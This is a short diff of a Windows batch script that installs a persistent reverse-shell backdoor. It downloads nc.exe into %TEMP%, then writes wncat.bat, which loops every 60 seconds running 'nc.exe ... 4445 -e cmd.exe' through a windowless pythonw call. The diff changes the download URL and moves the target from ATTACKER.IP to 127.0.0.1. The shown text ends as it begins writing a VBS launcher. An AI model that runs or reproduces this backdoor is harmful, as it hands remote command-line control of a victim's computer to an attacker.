@@ -2,12 +2,12 @@
 
 cd %TEMP%
 
-curl https://raw.githubusercontent.com/RAF-87/win-back-cat/main/files/nc.exe > nc.exe
+curl https://github.com/int0x33/nc.exe/blob/master/nc.exe?raw=true > nc.exe
 
 echo @echo off > wncat.bat
 echo :loop >> wncat.bat
 echo sleep 60 >> wncat.bat
-echo pythonw -c "from subprocess import check_output; check_output('nc.exe ATTACKER.IP 4445 -e cmd.exe', shell=True);" >> wncat.bat
+echo pythonw -c "from subprocess import check_output; check_output('nc.exe 127.0.0.1 4445 -e cmd.exe', shell=True);" >> wncat.bat
 echo goto loop >> wncat.bat
 
 echo Dim WinScriptHost > wncat.vbs
